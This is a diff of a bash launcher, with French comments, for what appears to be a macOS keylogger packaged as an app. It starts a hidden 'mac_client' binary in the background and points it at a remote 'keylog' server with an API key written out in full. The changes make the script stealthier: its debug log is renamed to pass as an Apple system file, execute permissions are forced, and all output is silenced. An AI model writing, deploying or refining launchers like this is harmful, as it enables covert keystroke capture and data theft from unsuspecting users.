@@ -1,25 +1,25 @@
 #!/bin/bash
 
-# 1. Trouver le dossier où se trouve ce script (dans le .app)
+# 1. Récupérer le dossier courant
 DIR=$(cd "$(dirname "$0")"; pwd)
-
-# 2. Définir les variables (URL et API KEY)
+BIN="$DIR/mac_client"
 SERVER_URL="https://api.keylog.claverie.site"
 API_KEY="72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ"
-BIN="$DIR/mac_client"
 
-# 3. Logs de débogage (pour comprendre pourquoi ça plante si besoin)
-LOGfile="/tmp/keylogger_debug.log"
-echo "[$(date)] Lancement depuis $DIR" >> "$LOGfile"
+# 2. AUTO-RÉPARATION (Crucial pour le déploiement)
+# On force les droits d'exécution au cas où ils auraient sauté
+chmod +x "$BIN"
 
-# 4. Vérifier si le client existe
-if [ ! -f "$BIN" ]; then
-    echo "[ERROR] mac_client introuvable dans $DIR" >> "$LOGfile"
+# 3. Logs (discrets)
+LOGfile="/tmp/.com.apple.system.debug.log"
+
+# 4. Lancement
+if [ -f "$BIN" ]; then
+    # On lance en arrière-plan et on se détache
+    nohup "$BIN" "$SERVER_URL" "$API_KEY" >/dev/null 2>&1 &
+else
+    echo "Error: Binary not found at $BIN" >> "$LOGfile"
     exit 1
 fi
-
-# 5. Lancer le client en arrière-plan
-# On utilise nohup pour qu'il survive à la fermeture du script
-nohup "$BIN" "$SERVER_URL" "$API_KEY" >> "$LOGfile" 2>&1 &
 
 exit 0
